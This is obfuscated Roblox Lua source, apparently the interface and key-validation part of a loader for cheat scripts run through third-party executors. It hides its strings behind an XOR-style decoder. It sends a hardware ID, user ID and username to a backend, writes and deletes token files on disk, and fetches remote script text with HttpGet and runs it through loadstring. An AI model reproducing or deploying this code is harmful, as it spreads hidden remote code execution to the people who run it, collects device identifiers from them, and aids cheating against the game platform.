local _bg = func14(_ed, UDim2.fromOffset(32, 344), UDim2.fromOffset(500, 56), Color3.new(1, 1, 1), 18)
_bg.ClipsDescendants = true
local _ym = func15(_bg, _u.violet, _u.fuchsia, 0)
local _op = func14(_bg, UDim2.new(-0.4, 0, -0.3, 0), UDim2.new(0.3, 0, 1.6, 0), Color3.new(1, 1, 1), nil)
_op.Rotation = 18
_op.BackgroundTransparency = 0.82
_op.Visible = false
local _ga = Instance.new(_de4yl({59,20,22,10,109,25,46,31,0,31},{111,113,110,126,47,108,90,107}))
_ga.BackgroundTransparency = 1
_ga.Size = UDim2.fromScale(1, 1)
_ga.Text = _de4yl({37,87,79,20,31,86},{118,34,45,121})
_ga.TextColor3 = _u.text
_ga.TextSize = 18
_ga.Font = Enum.Font.GothamBold
_ga.AutoButtonColor = false
_ga.ZIndex = 3
_ga.Parent = _bg
local _wm = Instance.new(_de4yl({108,6,9,21,21,86,68,76,12,31},{56,99,113,97,87,35,48}))
_wm.Position = UDim2.fromOffset(548, 344)
_wm.Size = UDim2.fromOffset(300, 56)
_wm.BackgroundColor3 = _u.panel
_wm.BorderSizePixel = 0
_wm.Text = _de4yl({33,62,41,125,72,117,74,24,31},{102,91,93,93,41,85,33,125})
_wm.TextColor3 = _u.soft
_wm.TextSize = 16
_wm.Font = Enum.Font.GothamMedium
_wm.AutoButtonColor = false
_wm.Parent = _ed
func12(_wm, UDim.new(0, 18))
func12(_wm, UDim.new(0, 18))
func13(_wm, _u.stroke, 1)

_wm.MouseEnter:Connect(function()
	_t:Create(_wm, _w, {BackgroundColor3 = _u.card}):Play()
end)

_wm.MouseLeave:Connect(function()
	_t:Create(_wm, _w, {BackgroundColor3 = _u.panel}):Play()
end)

_wm.MouseButton1Click:Connect(function()
	if _n.discord ~= "" then
		func(_n.discord, _de4yl({43,13,27,24,28,15,32},{111,100,104,123,115,125,68}))
	elseif _n.website ~= "" then
		func(_n.website, _de4yl({97,46,63,88,24,22,8},{54,75,93,43,113,98,109}))
	else
		local _b = _de4yl({35,34,83,19,89,75,16,102,31,58,23,51,65,86,68,72,23},{122,67,55,96,56,37,48,45})
		local _x = _de4yl({58,21,74,40,5,13,90,6,42,14,31,90,2,34,19,84,24,15,38,14,84,9,15,55,64,18,21,24,99,20,28,19,25,99,12,27,27,14,38,18,84,3,15,55,78},{116,122,106,67,96})
		local _f = 4

		if _l then
			pcall(_l, _de4yl({63,91,62,86,95,74,118,45,95,35,5,109,93,37,18,95,55},{102,58,90,37,62,36,86}), _de4yl({60,61,27,53,23,43,27,50,27,60,80,126,26,51,72,126,16,55,94,48,82,33,94,42,82,52,84,44,82,38,83,55,1,114,87,49,19,54,94,44,82,43,94,42,92},{114,82,59,94}), 4, _de4yl({44,24,20,42},{91,121,102,68}))
		else
			pcall(function()
				_q:SetCore(_de4yl({42,7,49,62,18,31,13,16,4,54,57,61,4,16,22,12},{121,98,95,90,92,112,121}), {Title = _b, Text = _x, Duration = _f or 4})
			end)
		end
	end
end)

local _uc = func16(_ed, "", 13, _u.sub, Enum.Font.Gotham, UDim2.fromOffset(34, 410), UDim2.fromOffset(460, 20))
local muted = _u.muted
local Gotham = Enum.Font.Gotham
local _jt = UDim2.fromOffset(500, 410)
local _lc = UDim2.fromOffset(348, 20)
func16(_ed, _de4yl({63,36,91,66,7,43,31,17,73,101,31,66,3,38,74,67,3,101,84,84,31,101,76,72,21,49,90,92},{102,69,63,49}), 11, muted, Gotham, _jt, _lc, Enum.TextXAlignment.Right)
local _qn = func14(_ed, UDim2.fromOffset(32, 436), UDim2.fromOffset(816, 3), _u.stroke, 2)
local _aq = func14(_qn, UDim2.new(), UDim2.fromScale(0, 1), _u.ok, 2)
local _ow = Instance.new(_de4yl({49,15,82,71,41,11,72,86,9},{101,106,42,51}))
_ow.AnchorPoint = Vector2.new(0.5, 0)
_ow.Position = UDim2.new(0.5, 0, 1, 14)
_ow.Size = UDim2.new(1, -64, 0, 0)
_ow.AutomaticSize = Enum.AutomaticSize.Y
_ow.BackgroundColor3 = Color3.fromRGB(28, 14, 44)
_ow.BackgroundTransparency = 0.1
_ow.Font = Enum.Font.GothamMedium
_ow.RichText = true
_ow.Text = ""
_ow.TextColor3 = Color3.fromRGB(235, 215, 255)
_ow.TextSize = 13
_ow.TextWrapped = true
_ow.Visible = false
_ow.Parent = _ed
func12(_ow, UDim.new(0, 10))
func12(_ow, UDim.new(0, 10))
local _oh = Instance.new(_de4yl({96,60,32,53,51,58,67,91,18},{53,117,112,84,87,94,42}))
local _mu = UDim.new(0, 8)
local _kn = UDim.new(0, 8)
_oh.PaddingTop = _mu
_oh.PaddingBottom = _kn
local _mw = UDim.new(0, 12)
local _rn = UDim.new(0, 12)
_oh.PaddingLeft = _mw
_oh.PaddingRight = _rn
_oh.Parent = _ow
func13(_ow, _u.violet, 1)
local _v = 0

local function func32(_tz, _lz)
	local _e = tonumber(_lz) or 0
	local _b = tostring(_tz or "")

	if _e == 0 or _b == "" then
		_ow.Visible = false
		return
	end

	if _e == _v and _ow.Visible then
		return
	end

	_v = _e
	local _o = _b:gsub("&", _de4yl({80,88,61,16,77},{118,57,80,96})):gsub("<", _de4yl({28,87,56,16},{58,59,76,43,62,87})):gsub(">", _de4yl({11,95,65,109},{45,56,53,86,95,126,57,125}))
	_ow.Text = _de4yl({114,7,25,48,12,110,46,14,34,14,4,99,90,109,8,35,123,81,48,24,90,112,113,3,112,32,56,16,55,27,3,34,11,44,51,16,44,114,98,3,112,93,89,56,23,32,57,95,68},{78,97,118,94,120,78,77,97}) .. _o
	_ow.Visible = true
	_ow.Size = UDim2.new(1, -64, 0, 0)
	_ow.Position = UDim2.new(0.5, 0, 1, 14)
end

func26(_oe, 0.1)
func26(_nt, 0.18)
func26(_gy, 0.24)
func26(_sj, 0.28)
func26(_sn, 0.22)
func26(_gp, 0.34)
func26(_ii, 0.38, 28)
func26(_bg, 0.46, 28)
func26(_wm, 0.5, 28)
local _mb = func14(_pb, UDim2.new(), UDim2.fromScale(1, 1), Color3.new(0, 0, 0), nil)
_mb.ZIndex = 50
local _un = TweenInfo.new(0.7, Enum.EasingStyle.Quad)
_t:Create(_mb, _un, {BackgroundTransparency = 1}):Play()

task.delay(0.8, function()
	_mb.Visible = false
end)

local _ec = {}
_ec[1], _ec[2] = Enum.UserInputType.Touch, Enum.UserInputType.Gamepad1
local _kb = 0

local function func33(_tz, _lz)
	local _e = math.clamp(_tz or 0.5, 0, 1)
	local _o = _lz or 0.04

	for _ma, _d in ipairs(_ec) do
		pcall(function()
			if _c:IsVibrationSupported(_d) then
				local Small = Enum.VibrationMotor.Small

				if not _c:IsMotorSupported(_d, Small) then
					Small = Enum.VibrationMotor.Large
				end

				_c:SetMotor(_d, Small, _e)
				_kb = _kb + 1
				local _k = _kb

				task.delay(_o, function()
					if _kb == _k then
						pcall(function()
							_c:SetMotor(_d, Small, 0)
						end)
					end
				end)
			end
		end)
	end
end

_p.InputBegan:Connect(function(_ki)
	local UserInputType = _ki.UserInputType
	if UserInputType == Enum.UserInputType.Touch or UserInputType == Enum.UserInputType.MouseButton1 then
		func33(0.45, 0.035)
	end
end)

local function func34(_tz)
	local _b = ""

	for k in _tz:gmatch(_de4yl({101,46,78},{64,125,101,50,41,52,54})) do
		if k:match(_de4yl({9,14,34},{87,43,67,94,87,108,92,122})) then
			_b = _b .. k:sub(1, 1):upper()
		end
		if #_b >= 2 then
			break
		end
	end

	return _b ~= "" and _b or _tz:sub(1, 2):upper()
end

local function func35(_mh)
	if not _qy.Parent then
		return true
	end

	_qy.Image = _mh
	local _vv = false

	pcall(function()
		_m:PreloadAsync({_qy}, function(_ma, _lz)
			if _lz == Enum.AssetFetchStatus.Success then
				_vv = true
			end
		end)
	end)

	if not _vv then
		return false
	end

	_t:Create(_qy, _y, {ImageTransparency = 0}):Play()
	_t:Create(_ia, _w, {TextTransparency = 1}):Play()
	return true
end

task.spawn(function()
	local ok, result = pcall(function()
		return _a:GetProductInfo(PlaceId)
	end)
	if ok and result and type(result.Name) == _de4yl({6,56,24,46,73,25},{117,76,106,71,39,126,50}) and result.Name ~= "" then
		local Name = result.Name
		_on.Text = Name
		_ia.Text = func34(Name)
	else
		_on.Text = _de4yl({100,44,24,65,127,62,14,93,33},{48,68,113,50,95,89,111})
		_ia.Text = func34(_de4yl({33,49,95,23,92,22,20,52,83},{117,89,54,100,124,113}))
	end
end)

local _uy = true

task.spawn(function()
	local _e = func4(_de4yl({27,6,24,38,27,4,0,42,87,12},{52,103,104,79}), {loader_id = tostring(LOADER_ID), game_id = tostring(GameId)}, 4)

	if _e then
		tostring(_e.supported)
		tostring(_e.message or "")
	end

	if not _pb.Parent then
		return
	end

	if not _e then
		local _dy
		_yv.Text, _dy = _de4yl({124,27,63,93,91,20,56,22,75,20,46,83,95,25,52,87,92,22,57},{62,122,92,54}), _u.warn
		_yv.TextColor3 = _dy
		_nq.Text, _nq.TextColor3 = "!", _u.warn
		return
	end

	if _e.supported == false then
		_uy = false
		local bad
		_yv.Text, bad = _de4yl({0,73,13,92,61,83,9,12,33,84,13,25,42},{78,38,121,124}), _u.bad
		_yv.TextColor3 = bad
		func29(false)
		_ag.Text, _ag.TextColor3 = _de4yl({1,81,37,18,45,52,44,35,54,83,33},{84,63,68,100,76,93,64,66}), _u.bad
		local bad1
		_uc.Text, bad1 = _e.message or _de4yl({7,24,16,17,115,23,24,15,54,80,16,17,115,30,22,22,115,3,12,18,35,31,11,22,54,20,87},{83,112,121,98}), _u.bad
		_uc.TextColor3 = bad1
		return
	end

	local ok
	_yv.Text, ok = _de4yl({58,8,78,70,71,33,57,12,25},{105,125,62,54,40,83,77}), _u.ok
	_yv.TextColor3 = ok
	func29(true)

	if type(_e.discord) == _de4yl({59,48,55,14,38,35},{72,68,69,103}) and _e.discord ~= "" then
		_n.discord = _e.discord
	end

	if type(_e.website) == _de4yl({75,20,87,0,47,15},{56,96,37,105,65,104}) and _e.website ~= "" then
		_n.website = _e.website
	end

	func31()

	if _e.loader_id then
		LOADER_ID = _e.loader_id
	end

	func32(_e.message, _e.message_id)
end)

task.spawn(function()
	if GameId ~= 0 and func35((_de4yl({1,62,17,56,27,41,4,46,73,115,70,56,10,44,12,113,52,61,4,41,58,63,6,34,85,53,13,113,86,56,79,59,78,110,92,122,85,52,84,126,70,106},{115,92,105,76})).format("rbxthumb://type=GameIcon&id=%d&w=256&h=256", GameId)) then
		return
	end

	local ok, result = pcall(function()
		return _a:GetProductInfo(PlaceId)
	end)

	local _e = ok and result and tonumber(result.IconImageAssetId)

	if _e and _e > 0 then
		func35(_de4yl({61,31,2,20,57,24,17,93,38,25,64,90,101},{79,125,122,117,74,107,116,41}) .. _e)
	end
end)

local _fs
local _bd

local function func36()
	if not _fs then
		return
	end
	pcall(function()
		func1({
			Url = BACKEND_URL .. _de4yl({107,32,13,95,16,43,39,27,90,86,42,36},{68,65,125,54,63}),
			Method = _de4yl({35,5,10,4},{115,74,89,80,102,62,48}),
			Headers = {[_de4yl({8,52,55,51,85,76,72,97,31,34,41,34},{75,91,89,71,48,34,60,76})] = _de4yl({33,22,78,49,16,0,90,43,41,9,80,114,19,16,84,49},{64,102,62,93,121,99,59,95})},
			Body = _g:JSONEncode({token = _fs}),
		})
	end)
end

pcall(function()
	game:BindToClose(func36)
end)

_z.PlayerRemoving:Connect(function(_zq)
	if _zq == LocalPlayer then
		if _fs then
			pcall(function()
				func1({
					Url = BACKEND_URL .. _de4yl({23,9,26,33,23,7,12,46,84,1,4,45},{56,104,106,72}),
					Method = _de4yl({28,62,50,122},{76,113,97,46,37,121,99,50}),
					Headers = {[_de4yl({29,46,66,83,64,18,74,70,10,56,92,66},{94,65,44,39,37,124,62,107})] = _de4yl({12,44,27,4,69,14,61,31,1,67,3,115,1,27,67,3},{109,92,107,104,44})},
					Body = _g:JSONEncode({token = _fs}),
				})
			end)
		end
	end
end)

local function func37()
	if _bd then
		return
	end

	_bd = true

	task.spawn(function()
		while _bd and _fs do
			task.wait(15)

			if _bd and _fs then
				local _n = {}
				_n.Url = BACKEND_URL .. _de4yl({111,17,12,91,127,5,14,33,2,8,80,53,12,31},{64,112,124,50,80,109,107})
				_n.Method = _de4yl({126,12,45,33},{46,67,126,117,90,121,76})
				_n.Headers = {[_de4yl({13,1,69,2,56,68,5,99,58,82,6,56},{78,110,43,118,93,42,113})] = _de4yl({56,85,78,62,63,58,68,74,59,57,55,10,84,33,57,55},{89,37,62,82,86})}
				_n.Body = _g:JSONEncode({token = _fs})
				local _d = func2(_n, 2)
				local _k = _d

				if _d then
					local Body = _d.Body

					local ok, result = pcall(function()
						return _g:JSONDecode(Body)
					end)

					_k = ok and type(result) == _de4yl({49,47,38,10,36},{69,78,68,102,65,36,105}) and result or nil
				end

				if _k and _k.success == false then
					if _k.reason ~= _de4yl({11,86,43,95,20,34,10,91},{111,63,88,62,118,78}) then
						pcall(function()
							if delfile and isfile and isfile(_o) then
								delfile(_o)
							end
						end)
					end

					if _k.forget then
						pcall(function()
							if delfile and isfile and isfile(_e) then
								delfile(_e)
							end
						end)
					end

					_fs = nil
					local message = _k.message
					_bd = nil
					message = message or _de4yl({2,29,75,81,10,5,21,11,52,22,92,71,7,68},{81,120,56,34,99,106,123,43})
					local _b = _de4yl({20,49,86,45,84,38,109,27,87,39,21,27,52,35,70,59,88},{77,80,50,94,53,72})
					local _yy = message
					local _f = 6

					if _l then
						pcall(_l, _de4yl({2,5,87,45,60,69,123,47,86,39,125,120,34,23,71,59,48},{91,100,51,94,93,43}), _yy, 6, _de4yl({63,7,38,79},{72,102,84,33,36,90,111,87}))
					else
						pcall(function()
							_q:SetCore(_de4yl({17,83,57,40,18,10,91,43,80,62,47,61,17,70,45,88},{66,54,87,76,92,101,47}), {Title = _b, Text = _yy, Duration = _f or 4})
						end)
					end
				else
					if _k and _k.message_id and tonumber(_k.message_id) ~= _v and tonumber(_k.message_id) ~= 0 then
						local _s = tonumber(_k.message_id)
						_v = _s
						local _x = tostring(_k.message or "")
						local _j = _de4yl({52,71,28,55,62,48,87,38,67,1,100,12,39,4,25,67,21,100,62,48,25,2,83,22,39,58,51,18,3,82},{109,38,120,68,95,94,119})
						local _kb = 8

						if _l then
							pcall(_l, _de4yl({96,25,44,64,88,46,25,51,45,74,25,19,64,11,60,86,84,96,88,22,38,92,76,46,90,29,37,86,87,52},{57,120,72,51,57,64}), _x, 8, nil)
						else
							pcall(function()
								_q:SetCore(_de4yl({38,55,27,24,45,17,53,80,19,59,22,29,23,23,46,87},{117,82,117,124,99,126,65,57}), {Title = _j, Text = _x, Duration = _kb or 4})
							end)
						end
					end
					continue
				end
			end

			break
		end
	end)
end

local function func38()
	local _e = UDim2.fromOffset(32, 246)
	for _ma, _o in ipairs({10, -10, 8, -8, 4, -4, 0}) do
		local _w = TweenInfo.new(0.04)
		local _n = {Position = _e + UDim2.fromOffset(_o, 0)}
		_t:Create(_ii, _w, _n):Play()
		task.wait(0.04)
	end
end

local _bu = false

local function func39()
	_op.Visible = true
	task.spawn(function()
		while _bu do
			_op.Position = UDim2.new(-0.4, 0, -0.3, 0)
			local _w = TweenInfo.new(0.7, Enum.EasingStyle.Linear)
			local _n = {Position = UDim2.new(1.2, 0, -0.3, 0)}
			_t:Create(_op, _w, _n):Play()
			task.wait(0.75)
		end
		_op.Visible = false
	end)
end

local _zj = false

local function func40()
	_zj = true
	local _w = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
	_t:Create(_at, _w, {Scale = _at.Scale * 0.9}):Play()
end

local function func41(_tz)
	local _d, _k = func2({
		Url = BACKEND_URL .. _de4yl({86,10,24,35,12,73,28,25,1,44,90},{121,107,104,74,35,63}),
		Method = _de4yl({29,43,10,19},{77,100,89,71,121,38,66,53}),
		Headers = {[_de4yl({103,9,23,1,27,27,65,9,50,0,5,27},{36,102,121,117,126,117,53})] = _de4yl({4,94,4,10,12,77,21,18,12,65,26,73,15,93,27,8},{101,46,116,102})},
		Body = _g:JSONEncode({
			loader_id = tostring(LOADER_ID),
			key = _tz,
			hwid = func5(),
			userId = tostring(LocalPlayer.UserId),
			gameId = tostring(GameId),
			username = LocalPlayer.Name,
		}),
	}, 3, function(_tz)
		_uc.Text = _de4yl({32,62,30,87,51,25,33,66,40,28,87,63,25,34,66,42,13,16,118,5,32,22,45,4,85,56,16,101,74},{98,95,125,60,86,119,69}) .. _tz .. _de4yl({87,121,104,75},{126,87,70,101})
		_uc.TextColor3 = _u.sub
	end)

	if not _d then
		tostring(_k)
		return false, _de4yl({106,38,95,1,0,9,39,69,25,68,91,44,75,14,12,9,61,66,8,68,75,40,73,6,1,71,45,16,77},{41,73,42,109,100}) .. tostring(_k)
	end

	local _ly = func3(_d.Body)

	if not _ly then
		tostring(_d.StatusCode)
		tostring(_d.Body):sub(1, 160)
		return false, _de4yl({11,64,87,109,19,8,68,86,38,79,64,40,65,11,69,73,36,1,81,44,2,6,82,72,45,1,27,5,53,57,103,6},{73,33,51,77,97,109,55,38}) .. tostring(_d.StatusCode) .. ")."
	end

	tostring(_ly.success)
	tostring(_ly.reason)

	if _ly.success then
		_fs = _ly.token

		pcall(function()
			if writefile then
				writefile(_e, _tz)
			end
		end)

		local token = _ly.token

		pcall(function()
			if writefile and type(token) == _de4yl({31,77,4,17,60,11},{108,57,118,120,82}) then
				writefile(_o, token)
			end
		end)

		func37()
		return true, _de4yl({122,20,11,117,87,16,56,32,65,5,23,49,24,83,23,36,68,31,17,61,95,29,60,107,31,95},{49,113,114,85,54,115,91,69}), _ly.script
	end

	if _ly.forget then
		pcall(function()
			if delfile and isfile and isfile(_e) then
				delfile(_e)
			end
		end)
		pcall(function()
			if delfile and isfile and isfile(_o) then
				delfile(_o)
			end
		end)
	end

	return false, _ly.message or _de4yl({122,34,61,8,59,82,30,50,88,46,32,15,125,93,28,58,64,34,43,65,117},{44,71,79,97,93,59,125,83}) .. tostring(_ly.reason) .. ")"
end

local function func42(_tz)
	local _e = func2({
		Url = BACKEND_URL .. _de4yl({10,73,86,35,10,90,67,57,80,69,67},{37,40,38,74}),
		Method = _de4yl({48,1,120,40},{96,78,43,124}),
		Headers = {[_de4yl({29,90,25,76,28,84,19,115,97,14,72,28},{94,53,119,56,121,58,103})] = _de4yl({89,4,1,3,19,0,17,68,81,27,31,64,16,16,31,94},{56,116,113,111,122,99,112,48})},
		Body = _g:JSONEncode({token = _tz}),
	}, 2)

	local _d = _e and func3(_e.Body)

	if _d and _d.success and type(_d.script) == _de4yl({30,26,56,24,3,9},{109,110,74,113}) then
		_fs = _d.token or _tz
		local _k = _fs

		pcall(function()
			if writefile and type(_k) == _de4yl({77,72,85,95,65,56},{62,60,39,54,47,95}) then
				writefile(_o, _k)
			end
		end)

		func37()
		return true, _d
	end

	if _d then
		pcall(function()
			if delfile and isfile and isfile(_o) then
				delfile(_o)
			end
		end)
	end

	return false, _d
end

local function func43(_tz)
	if type(_tz) ~= _de4yl({18,24,85,6,29,94},{97,108,39,111,115,57}) then
		local _b = _de4yl({37,16,86,22,82,46,92,58,87,28,19,19,5,2,70,0,94},{124,113,50,101,51,64})
		local _x = _de4yl({126,29,63,31,88,86,27,35,79,77,80,28,106,31,91,64,12,102,75,81,80,88,53,90,75,67,29,52,31,74,80,22,50,31,87,90,88,53,92,75,92,8,50,17,25,116,11,45,31,77,93,29,102,80,78,91,29,52,31,77,90,88,37,87,92,86,19,102,75,81,80,88,42,80,88,81,29,52,24,74,21,11,37,77,80,69,12,104},{53,120,70,63,57})
		local _f = 8

		if _l then
			pcall(
				_l,
				_de4yl({125,23,77,82,58,74,86,98,68,34,4,37,80,82,47,65,27},{36,118,41,33,91}),
				_de4yl({124,84,86,10,86,82,76,79,71,69,74,78,27,17,77,95,67,17,91,66,82,17,92,79,69,71,74,88,23,66,74,68,67,17,65,69,23,66,76,88,94,65,91,4,23,112,92,65,23,69,71,79,23,94,88,68,82,67,15,94,88,17,76,66,82,82,68,10,67,89,74,10,91,94,78,78,82,67,8,89,23,66,76,88,94,65,91,4},{55,49,47,42}),
				8,
				_de4yl({58,66,80,29},{77,35,34,115,110})
			)
		else
			pcall(function()
				_q:SetCore(_de4yl({120,68,61,13,50,35,95,72,53,0,31,45,95,72,60,7},{43,33,83,105,124,76}), {Title = _b, Text = _x, Duration = _f or 4})
			end)
		end

		return
	end

	local _e = _tz:gsub(_de4yl({23,134,135,243,242,135,151},{73,69,40,49}), "")
	local _o = _e

	if _e:match(_de4yl({109,82,4,20,74},{51,119,119,62,110,35})) then
		local _j = _de4yl({28,83,78,73,36,92,10,113,32,75,10,105,60,65,94,95,40},{69,50,42,58})
		local _yb = _de4yl({33,65,77,107,19,9,71,81,59,6,15,64,24,107,16,31,80,20,63,26,15,4,80,46,30,3,82,81,57,23,14,4,71,40,0,3,84,64,107,27,25,4,81,38,2,30,93,26},{106,36,52,75,114})
		local _s = 8

		if _l then
			pcall(_l, _de4yl({98,76,40,29,15,26,27,102,41,23,78,39,66,94,56,11,3},{59,45,76,110,110,116}), _de4yl({51,10,81,98,33,51,27,10,88,54,37,52,84,79,74,55,52,112,12,7,77,98,36,53,20,6,94,39,50,53,28,79,91,33,50,57,8,27,8,43,51,112,29,2,88,54,57,126},{120,111,40,66,64,80}), 8, _de4yl({77,42,36,69},{58,75,86,43,100,92,111,68}))
		else
			pcall(function()
				_q:SetCore(_de4yl({98,89,65,10,30,26,69,85,73,7,51,20,69,85,64,0},{49,60,47,110,80,117}), {Title = _j, Text = _yb, Duration = _s or 4})
			end)
		end

		return
	end

	if _e:match(_de4yl({100,84,73,25,71,65,16,74,2,5,9,0,26,65,105,90,31,64,5,17},{58,113,58,51,47,53,100})) then
		local _d = _e:match(_de4yl({103,118,27,124,21,82,106,120,65,115,78,93,29},{57,83,104,86,61,119}))

		local ok, result = pcall(function()
			return game:HttpGet(_d)
		end)

		if not ok or type(result) ~= _de4yl({55,35,94,45,1,59},{68,87,44,68,111,92,106}) or result == "" then
			tostring(result)
			local _wg = _de4yl({29,19,87,2,75,72,86,15,23,74,81,121,95,5,48,23,94},{68,114,51,113,42,38,118})
			local _fv = _de4yl({120,2,21,86,63,12,59,84,25,64,94,52,91,59,87,2,1,94,123,88,61,94,77,19,89,41,69,37,79,77,53,104,23,2},{59,109,96,58,91,44,85})
			local _v = 8

			if _l then
				pcall(_l, _de4yl({30,72,86,43,63,40,103,98,87,33,126,21,62,90,70,61,51},{71,41,50,88,94,70}), _de4yl({39,69,78,74,16,68,68,84,82,84,0,69,76,72,24,11,75,95,6,0,12,79,27,85,23,22,67,75,82,84,49,120,119,8},{100,42,59,38,116}), 8, _de4yl({51,17,44,34},{68,112,94,76,116,118,108}))
			else
				pcall(function()
					_q:SetCore(_de4yl({127,62,74,31,119,6,45,56,74,50,71,26,77,0,54,63},{44,91,36,123,57,105,89,81}), {Title = _wg, Text = _fv, Duration = _v or 4})
				end)
			end

			return
		end

		_o = result
	end

	local _n = {}

	if type(RAW_LOADSTRING) == _de4yl({76,44,87,93,94,48,86,80},{42,89,57,62}) then
		table.insert(_n, RAW_LOADSTRING)
	end

	if type(loadstring) == _de4yl({65,18,81,69,83,14,80,72},{39,103,63,38}) and loadstring ~= RAW_LOADSTRING then
		table.insert(_n, loadstring)
	end

	if #_n == 0 then
		local _kx = _de4yl({63,31,2,7,83,13,70,53,3,13,18,48,31,13,18,17,95},{102,126,102,116,50,99})
		local _wv = _de4yl({60,12,69,24,115,92,29,6,83,31,39,86,23,67,84,5,54,74,11,68,68,74,32,76,21,19,95,24,39,25,9,12,81,14,32,77,23,10,94,13,125},{101,99,48,106,83,57})
		local _kb = 8

		if _l then
			pcall(_l, _de4yl({49,73,59,16,9,70,127,40,13,81,127,48,17,91,43,6,5},{104,40,95,99}), _de4yl({113,9,24,35,90,20,94,77,5,24,37,21,3,6,76,9,8,34,20,86,82,8,21,24,33,10,30,84,92,70,1,62,27,21,85,92,20,4,63,29,95},{40,102,109,81,122,113,38}), 8, _de4yl({43,40,25,8},{92,73,107,102}))
		else
			pcall(function()
				_q:SetCore(_de4yl({122,84,15,64,103,94,21,77,79,88,2,69,93,88,14,74},{41,49,97,36}), {Title = _kx, Text = _wv, Duration = _kb or 4})
			end)
		end

		return
	end

	local _oy
	local _ly

	for _ma, _k in ipairs(_n) do
		local _i, result1, result2 = pcall(_k, _o)

		if _i and type(result1) == _de4yl({26,44,61,24,34,90,43,51},{124,89,83,123,86,51,68,93}) then
			_ly = result1
			break
		end

		_oy = _i and result2 or result1
	end

	if type(_ly) ~= _de4yl({22,36,89,72,72,90,31,63},{112,81,55,43,60,51}) then
		tostring(_oy)
		local _jf = _de4yl({118,60,19,35,71,70,5,57,0,35,91,87,65,127,21,37,23,81,74,50,17,35,91,87,31,127},{37,95,97,74,55,50}) .. tostring(_oy):sub(1, 120)
		local _fk = _de4yl({114,36,46,68,74,43,106,124,78,60,106,100,82,54,62,82,70},{43,69,74,55})
		local _vb = 8

		if _l then
			pcall(_l, _de4yl({100,53,61,4,92,58,121,60,88,45,121,36,68,39,45,18,80},{61,84,89,119}), _jf, 8, _de4yl({15,23,89},{109,118,61,37,54}))
		else
			pcall(function()
				_q:SetCore(_de4yl({3,49,64,88,119,53,67,9,54,61,77,93,77,51,88,14},{80,84,46,60,57,90,55,96}), {Title = _fk, Text = _jf, Duration = _vb or 4})
			end)
		end

		return
	end

	local _rg, result3 = xpcall(_ly, function(_tz)
		return tostring(_tz) .. "\n" .. debug.traceback()
	end)

	if not _rg then
		tostring(result3)
		local _xy = _de4yl({116,52,30,3,31,83,119,9,24,29,72,37,86,74},{39,87,108,106,111}) .. tostring(result3):sub(1, 120)
		local _fd = _de4yl({48,40,5,41,34,46,64,34,44,24,122,16,57,19,29,44,12},{105,73,97,90,67,64,96})
		local _hz = 8

		if _l then
			pcall(_l, _de4yl({35,7,58,26,27,8,126,34,31,31,126,58,3,21,42,12,23},{122,102,94,105}), _xy, 8, _de4yl({56,31,16},{90,126,116,122,67,65,33,49}))
		else
			pcall(function()
				_q:SetCore(_de4yl({106,46,11,38,42,86,63,12,36,13,90,42,17,43,11,87},{57,75,101,66,100}), {Title = _fd, Text = _xy, Duration = _hz or 4})
			end)
		end
	end
end

local function func44(_tz, _lz)
	if _bu or _zj then
		if not _lz then
			local _dy = _u.warn
			local _b = _de4yl({19,94,81,30,46,118,62,0,37,73,83,27,44,49,125,17,47,95,74,82,41,51,36,68,96,90,84,23,35,37,56,72,55,75,81,6,108,120,115},{64,42,56,114,66,86,93,104})

			pcall(function()
				_uc.Text = _b
				_uc.TextColor3 = _dy or _u.sub
			end)
		end
		return
	end

	local _e = (_tz or ""):gsub(_de4yl({10,50,70},{47,65,109,57,89,96}), "")

	if _e == "" then
		if not _lz then
			local _n = {{0.8, 0.06}}

			task.spawn(function()
				for _ma, _e in ipairs(_n) do
					func33(_e[1], _e[2])
					task.wait(_e[2] + (_e[3] or 0.05))
				end
			end)

			_uc.Text = _de4yl({56,84,73,12,4,72,84,26,19,4,17,21,92,17,19,27,65,20},{104,53,58,120,97})
			_uc.TextColor3 = _u.warn
			func38()
		end
		return
	end

	if not _uy then
		_uc.Text = _de4yl({102,58,61,88,15,88,77,95,55,116,66,92,31,66,93,38,116,88,90,79,92,93,32,32,78,75,17},{50,82,84,43,47,63,44})
		_uc.TextColor3 = _u.bad
		return
	end

	_bu = true
	_aq.Size = UDim2.fromScale(0, 1)
	_uc.Text = ""
	_ag.Text, _ag.TextColor3 = _de4yl({111,41,80,31,37,67,35,68,94},{57,76,34,118,67,58,74,42}), _u.warn
	_ga.Text = _de4yl({114,44,17,85,16,88,42,19,24,85,31},{49,68,116,54,123})
	func39()
	local _vv = false
	local _wc = false

	task.delay(35, function()
		if _vv then
			return
		end

		_wc = true
		_bu = false
		_ga.Text = _de4yl({8,63,60,79,88,93},{91,74,94,34,49,41})
		_ag.Text, _ag.TextColor3 = _de4yl({44,68,12,78,47,33,22,84,28,28,56,32},{103,33,117,110,93,68}), _u.warn
		local bad = _u.bad
		local _b = _de4yl({50,40,53,58,38,102,9,52,44,127,33,41,8,53,57,60,54,47,8,38,120,43,42,35,70,35,57,60,41,35,8,37,118,127,18,52,3,50,43,127,17,51,4,44,49,43,98,50,9,97,44,45,59,102,7,38,57,54,44,104},{102,65,88,95,66,70})

		pcall(function()
			_uc.Text = _b
			_uc.TextColor3 = bad or _u.sub
		end)
	end)

	task.spawn(function()
		local ok, result, result1, result2 = pcall(func41, _e)
		local _ca = result2
		_vv = true

		if _wc then
			return
		end

		_bu = false

		if not ok then
			tostring(result)
			local _o = tostring(result):sub(1, 90)
			_ca = nil
			result1 = _de4yl({61,43,7,86,1,26,36,31,19,22,6,55,28,65,73,84},{116,69,115,51,115}) .. _o
			result = false
		end

		if result then
			local _n = {}
			_n[1], _n[2] = {0.6, 0.05}, {1, 0.09}

			task.spawn(function()
				for _ma, _e in ipairs(_n) do
					func33(_e[1], _e[2])
					task.wait(_e[2] + (_e[3] or 0.05))
				end
			end)

			_ga.Text = _de4yl({3,54,24,93,94,38,31,20},{85,83,106,52,56,79,122,112})
			_ym.Color = ColorSequence.new(_u.ok, Color3.fromRGB(16, 185, 129))
			_ag.Text, _ag.TextColor3 = _de4yl({120,73,14,92,41,58,51,1},{46,44,124,53,79,83,86,101}), _u.ok
			_uc.Text = result1 or _de4yl({36,37,11,74,46,2,89,10,48,6,15,43,79,26,35,33,7,4,44,9,83,1,39,92,68,97},{111,64,114,106,79,97,58})
			_uc.TextColor3 = _u.ok
			local _w = TweenInfo.new(0.9, Enum.EasingStyle.Quad)
			local _gu = {Size = UDim2.fromScale(1, 1)}
			_t:Create(_aq, _w, _gu):Play()
			local _uy = false

			local function func()
				if _uy then
					return
